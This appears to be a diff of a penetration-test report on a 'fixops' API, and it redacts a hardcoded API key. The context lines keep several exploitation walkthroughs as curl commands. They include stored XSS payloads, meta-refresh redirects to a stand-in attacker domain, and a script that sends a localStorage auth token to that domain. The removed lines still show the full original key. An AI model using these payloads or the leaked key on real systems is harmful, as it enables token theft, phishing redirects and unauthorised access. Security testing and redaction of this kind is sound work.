@@ -65,7 +65,7 @@ None — single-host deployment at `host.docker.internal:8000`
 
 **Prerequisites:**
 - Valid API key (header: `X-API-Key`) or Bearer JWT token
-- Confirmed working API key (from git history): `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`
+- Confirmed working API key (from git history): `fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN`
 
 **Exploitation Steps:**
 
@@ -73,7 +73,7 @@ None — single-host deployment at `host.docker.internal:8000`
 
 ```bash
 curl -s -X POST "http://host.docker.internal:8000/api/v1/policy-generator/generate" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
     "custom_title": "</title><meta http-equiv=\"refresh\" content=\"0;url=http://ATTACKER-DOMAIN.com/capture\"><title>",
@@ -88,7 +88,7 @@ Response includes `id` field — record as `[POLICY_ID]`.
 
 ```bash
 curl -s -X PUT "http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/content" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
     "content": "# <img src=x onerror=alert(document.cookie)>\n\n## Normal Heading\n\n- <svg/onload=alert(document.cookie)> injected list item\n\n| <script>alert(document.cookie)<\/script> | Normal Header |\n| <img src=x onerror=alert(2)> | Cell |\n\nParagraph <details open ontoggle=alert(document.cookie)>injection</details>"
@@ -99,13 +99,13 @@ curl -s -X PUT "http://host.docker.internal:8000/api/v1/policy-generator/policie
 
 ```bash
 curl -s "http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_"
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN"
 ```
 
 4. **Share the export URL with a victim (api_key as query parameter for direct URL access):**
 
 ```
-http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html&api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_
+http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html&api_key=fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN
 ```
 
 When a victim opens this URL, their browser executes the `<meta http-equiv="refresh">` tag and navigates to `http://ATTACKER-DOMAIN.com/capture`.
@@ -157,7 +157,7 @@ Confirmed report IDs used during testing:
 - **Severity:** High
 
 **Prerequisites:**
-- Valid API key: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`
+- Valid API key: `fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN`
 
 **Exploitation Steps:**
 
@@ -165,7 +165,7 @@ Confirmed report IDs used during testing:
 
 ```bash
 curl -s -X POST "http://host.docker.internal:8000/api/v1/compliance-reports/generate" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
     "title": "</title><meta http-equiv=\"refresh\" content=\"0;url=http://ATTACKER-DOMAIN.com/steal\"><title>",
@@ -180,7 +180,7 @@ Capture `id` from response as `[REPORT_ID]`.
 
 ```bash
 curl -s "http://host.docker.internal:8000/api/v1/compliance-reports/[REPORT_ID]/export/html" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN" \
   -D -
 ```
 
@@ -189,7 +189,7 @@ Confirm: No `Content-Disposition` header in response. The meta-refresh payload a
 3. **Construct victim URL and trigger redirect:**
 
 ```
-http://host.docker.internal:8000/api/v1/compliance-reports/[REPORT_ID]/export/html?api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_
+http://host.docker.internal:8000/api/v1/compliance-reports/[REPORT_ID]/export/html?api_key=fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN
 ```
 
 Send this URL to a victim (e.g., via email, Slack, Jira ticket). The victim opens the "compliance report" link and is immediately redirected to the attacker's domain.
@@ -238,7 +238,7 @@ content-security-policy: default-src 'none'; frame-ancestors 'none'
 - **Severity:** High
 
 **Prerequisites:**
-- Valid API key: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`
+- Valid API key: `fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN`
 
 **Exploitation Steps:**
 
@@ -246,7 +246,7 @@ content-security-policy: default-src 'none'; frame-ancestors 'none'
 
 ```bash
 curl -s -X POST "http://host.docker.internal:8000/api/v1/policy-generator/generate" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
     "custom_title": "</title><meta http-equiv=\"refresh\" content=\"0;url=http://ATTACKER-DOMAIN.com/steal\"><title>",
@@ -261,13 +261,13 @@ Capture `id` as `[POLICY_ID]`.
 
 ```bash
 curl -s "http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_"
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN"
 ```
 
 3. **Deliver victim URL:**
 
 ```
-http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html&api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_
+http://host.docker.internal:8000/api/v1/policy-generator/policies/[POLICY_ID]/export?format=html&api_key=fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN
 ```
 
 **Proof of Impact:**
@@ -304,7 +304,7 @@ Confirmed policy ID: `c2191f35-93ae-4a9b-b0a6-82e128b0d71b`
 - **Severity:** High
 
 **Prerequisites:**
-- Valid API key: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`
+- Valid API key: `fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN`
 - Victim must open the downloaded HTML file (standard user behavior when reviewing security reports)
 
 **Exploitation Steps:**
@@ -313,7 +313,7 @@ Confirmed policy ID: `c2191f35-93ae-4a9b-b0a6-82e128b0d71b`
 
 ```bash
 curl -s -X POST "http://host.docker.internal:8000/api/v1/reports" \
-  -H "X-API-Key: fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
+  -H "X-API-Key: fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
     "name": "<script>var t=localStorage.getItem(\"aldeci.authToken\");document.location=\"http://ATTACKER-DOMAIN.com/steal?token=\"+encodeURIComponent(t);</script>",
@@ -328,7 +328,7 @@ Capture `id` as `[REPORT_ID]`.
 2. **Download the report file (victim action):**
 
 ```bash
-curl -s "http://host.docker.internal:8000/api/v1/reports/[REPORT_ID]/file?api_key=fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_" \
+curl -s "http://host.docker.internal:8000/api/v1/reports/[REPORT_ID]/file?api_key=fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN" \
   -o malicious_report.html
 ```
 
@@ -452,7 +452,7 @@ content-security-policy: default-src 'none'; frame-ancestors 'none'
 
 **Prerequisites:**
 - Valid API key (any scope). The endpoint's `_auth_dep` has a passthrough fallback when `core.auth_middleware` fails to import, potentially making it unauthenticated.
-- API Key used in testing: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`
+- API Key used in testing: `fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN`
 
 **Exploitation Steps:**
 
@@ -538,7 +538,7 @@ The `except ValueError: return False` fallback silently passes these as "not pri
 
 **Prerequisites:**
 - Valid API key (any scope — connector endpoints do not require `write:integrations` scope based on live testing)
-- API Key used: `fixops_ent_38wJA8mb7CsbJ3PaLvKNz7lFnLWvFWXti_5NcdISXSogi_4grP24NAe_XymVfps_`
+- API Key used: `fixops_ent_REDACTED_SET_FIXOPS_API_TOKEN`
 
 **Exploitation Steps:**
 
